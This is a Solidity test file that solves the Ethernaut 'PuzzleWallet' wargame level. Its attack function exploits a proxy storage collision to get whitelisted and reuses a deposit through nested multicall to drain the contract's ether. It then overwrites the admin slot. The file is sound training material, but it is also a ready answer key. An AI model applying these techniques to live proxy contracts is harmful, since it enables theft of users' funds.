// SPDX-License-Identifier: Unlicense
pragma solidity =0.8.23;

import {Tests} from "@core/Tests.sol";
import {PuzzleWalletFactory, PuzzleWallet, PuzzleProxy} from "../levels/24_PuzzleWallet/PuzzleWalletFactory.sol";

contract TestPuzzleWallet is Tests {
    PuzzleProxy private level;
    PuzzleWallet private puzzleWallet;

    /* =============================== SETUP&ATTACK =============================== */

    constructor() {
        levelFactory = new PuzzleWalletFactory();
    }

    function setupLevel() internal override {
        levelAddress = payable(this.createLevelInstance{value: 0.001 ether}());
        level = PuzzleProxy(levelAddress);
        puzzleWallet = PuzzleWallet(address(level));
    }

    function attack() internal override {
        vm.startPrank(PLAYER);

        // Whitelist ✅
        level.proposeNewAdmin(PLAYER);
        puzzleWallet.addToWhitelist(PLAYER);

        // By batching the transactions and sending only 0.001 ether we're able to update our balance twice (2x0.001 ether).
        // And drain the balance of the proxy
        bytes[] memory callsDeep = new bytes[](1);
        callsDeep[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);
        bytes[] memory calls = new bytes[](2);
        calls[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);
        calls[1] = abi.encodeWithSelector(PuzzleWallet.multicall.selector, callsDeep);
        puzzleWallet.multicall{value: 0.001 ether}(calls);
        puzzleWallet.execute(PLAYER, 0.002 ether, "");

        // Overriding the storage
        puzzleWallet.setMaxBalance(uint256(uint160(PLAYER)));
        assertEq(level.admin(), PLAYER);

        vm.stopPrank();
    }

    /* =============================== TEST LEVEL =============================== */

    function testLevel() external {
        runLevel();
    }
}
